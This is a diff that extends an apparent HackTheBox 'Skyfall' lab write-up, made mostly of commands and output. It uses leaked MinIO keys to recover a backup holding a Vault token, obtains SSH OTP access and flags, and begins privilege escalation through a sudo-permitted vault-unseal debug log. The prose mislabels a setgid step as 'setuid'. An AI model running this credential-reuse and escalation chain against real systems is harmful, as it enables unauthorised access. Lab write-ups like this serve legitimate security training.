@@ -327,3 +327,262 @@ The `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` found under `MinioEnv`:
   }
 }
 ```
+
+### 2.3. Looking around with MinIO credentials
+
+Googling for MinIO usage leads to the client software `mc`: https://min.io/docs/minio/linux/reference/minio-mc.html
+
+```console
+root@kali:~# curl https://dl.min.io/client/mc/release/linux-amd64/mc --create-dirs -o $HOME/minio-binaries/mc
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 25.6M  100 25.6M    0     0  7497k      0  0:00:03  0:00:03 --:--:-- 7497k
+
+root@kali:~# chmod +x $HOME/minio-binaries/mc
+
+root@kali:~# export PATH=$PATH:$HOME/minio-binaries/
+
+root@kali:~# mc alias set skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
+mc: Configuration written to `/root/.mc/config.json`. Please update your access credentials.
+mc: Successfully created `/root/.mc/share`.
+mc: Initialized share uploads `/root/.mc/share/uploads.json` file.
+mc: Initialized share downloads `/root/.mc/share/downloads.json` file.
+Added `skyfall` successfully.
+
+root@kali:~# mc ls -r --versions skyfall
+[2023-11-08 12:59:15 +08]     0B askyy/
+[2023-11-08 13:35:28 +08]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
+[2023-11-10 05:37:25 +08] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
+[2023-11-10 05:37:09 +08] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
+[2023-11-10 05:36:30 +08] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
+[2023-11-08 12:58:56 +08]     0B btanner/
+[2023-11-08 13:35:36 +08]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
+[2023-11-08 12:58:33 +08]     0B emoneypenny/
+[2023-11-08 13:35:56 +08]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
+[2023-11-08 12:58:22 +08]     0B gmallory/
+[2023-11-08 13:36:02 +08]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
+[2023-11-08 08:08:01 +08]     0B guest/
+[2023-11-08 08:08:05 +08]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
+[2023-11-08 12:59:05 +08]     0B jbond/
+[2023-11-08 13:35:45 +08]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
+[2023-11-08 12:58:10 +08]     0B omansfield/
+[2023-11-08 13:36:09 +08]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
+[2023-11-08 12:58:45 +08]     0B rsilva/
+[2023-11-08 13:35:51 +08]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
+```
+
+```console
+root@kali:~# mc cp --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz .
+...fall.htb/askyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 54.48 KiB/s 0s
+
+root@kali:~# mkdir askyy_home_backup
+
+root@kali:~# tar xvf home_backup.tar.gz -C ./askyy_home_backup
+./
+./.profile
+./.bashrc
+./.ssh/
+./.ssh/authorized_keys
+./.sudo_as_admin_successful
+./.bash_history
+./.bash_logout
+./.cache/
+./.cache/motd.legal-displayed
+```
+
+`VAULT_API_ADDR` and `VAULT_TOKEN` found in `.bashrc` (v2):
+
+```console
+root@kali:~# cat ./askyy_home_backup/.bashrc
+⋮
+export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
+export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+⋮
+```
+
+### 2.4. Access Vault
+
+Get the [Vault Client](https://developer.hashicorp.com/vault/downloads#linux) and access the Vault with the `VAULT_TOKEN`
+
+```console
+root@kali:~# sed -i '0,/localhost/a 10.10.11.254    prd23-vault-internal.skyfall.htb' /etc/hosts
+
+root@kali:~# curl -sLO https://releases.hashicorp.com/vault/1.17.2/vault_1.17.2_linux_amd64.zip
+
+root@kali:~# unzip vault_1.17.2_linux_amd64.zip
+Archive:  vault_1.17.2_linux_amd64.zip
+  inflating: vault
+  inflating: LICENSE.txt
+
+root@kali:~# mv vault /usr/local/bin/
+
+root@kali:~# export VAULT_ADDR=http://prd23-vault-internal.skyfall.htb
+
+root@kali:~# vault login
+Token (will be hidden):
+WARNING! The VAULT_TOKEN environment variable is set! The value of this
+variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
+update its value accordingly.
+
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+
+Key                  Value
+---                  -----
+token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
+token_accessor       rByv1coOBC9ITZpzqbDtTUm8
+token_duration       431958h30m18s
+token_renewable      true
+token_policies       ["default" "developers"]
+identity_policies    []
+policies             ["default" "developers"]
+```
+
+Guessing SSH access - typicaly SSH credentials are placed on `ssh/roles` path in Vault, let's try querying:
+
+```console
+root@kali:~# vault token capabilities ssh/roles
+list
+
+root@kali:~# vault list ssh/roles
+Keys
+----
+admin_otp_key_role
+dev_otp_key_role
+```
+
+2 methods found for logging in:
+
+1. Generating SSH OTP then logging in:
+
+```console
+root@kali:~# vault write ssh/creds/dev_otp_key_role ip=10.10.11.254 username=askyy
+Key                Value
+---                -----
+lease_id           ssh/creds/dev_otp_key_role/ohYg5PjGRJeL5mC3ZLZTJCwj
+lease_duration     768h
+lease_renewable    false
+ip                 10.10.11.254
+key                32532fe5-132c-a69a-da61-3d51bdb00301
+key_type           otp
+port               22
+username           askyy
+root@kali:~# ssh askyy@10.10.11.254
+Warning: Permanently added '10.10.11.254' (ED25519) to the list of known hosts.
+(askyy@10.10.11.254) Password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Jul 18 14:29:20 2024 from 10.10.14.76
+askyy@skyfall:~$ id
+uid=1000(askyy) gid=1000(askyy) groups=1000(askyy)
+```
+
+2. Use Vault to automatically log in:
+
+> [!Note]
+>
+> `sshpass` needs to be installed on Kali.
+>
+> Otherwise, Vault will warn about `sshpass` and just display the OTP to be entered manually
+
+```console
+root@kali:~# vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
+Warning: Permanently added '10.10.11.254' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Jul 18 14:39:55 2024 from 10.10.14.76
+askyy@skyfall:~$ ls -lR
+.:
+total 4
+-rw-r----- 1 root askyy 33 Jul 17 19:53 user.txt
+askyy@skyfall:~$ cat user.txt
+a401eefac043d0f7f9ac55a8a786621f
+```
+
+## 3. Privilege Escalation
+
+Listing `sudo` rights reveal user `askyy` can execute `/root/vault/vault-unseal`
+
+```console
+askyy@skyfall:~$ sudo -l
+Matching Defaults entries for askyy on skyfall:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User askyy may run the following commands on skyfall:
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
+askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
+Usage:
+  vault-unseal [OPTIONS]
+
+Application Options:
+  -v, --verbose        enable verbose output
+  -d, --debug          enable debugging output to file (extra logging)
+  -c, --config=PATH    path to configuration file
+
+Help Options:
+  -h, --help           Show this help message
+
+askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
+[+] Reading: /etc/vault-unseal.yaml
+[-] Security Risk!
+[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+[>] Check interval: 5s
+[>] Max checks: 5
+[>] Checking seal status
+[+] Vault sealed: false
+```
+
+The debug option `-d` writes a `debug.log` file, but the file is written with `600` permissions and `root:root` ownership
+
+```
+askyy@skyfall:~$ ls -l
+total 8
+-rw------- 1 root root  590 Jul 18 14:57 debug.log
+-rw-r----- 1 root askyy  33 Jul 17 19:53 user.txt
+```
+
+Since the `debug.log` file is created in `askyy`'s home directory, `setuid` can be used to force the user ownership to `askyy`.
+
+The `debug.log` file can then be read:
+
+```console
+askyy@skyfall:~$ ls -ld ~
+drwxr-x--- 4 askyy askyy 4096 Jul 18 15:01 /home/askyy
+askyy@skyfall:~$ chmod g+s ~
+askyy@skyfall:~$ ls -ld ~
+drwxr-s--- 4 askyy askyy 4096 Jul 18 15:01 /home/askyy
+askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -dv
+[+] Reading: /etc/vault-unseal.yaml
+[-] Security Risk!
+[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+[>] Check interval: 5s
+[>] Max checks: 5
+[>] Checking seal status
+[+] Vault sealed: false
+askyy@skyfall:~$ ls -l
+total 8
+-rw------- 1 root askyy 590 Jul 18 15:03 debug.log
+-rw-r----- 1 root askyy  33 Jul 17 19:53 user.txt
+```
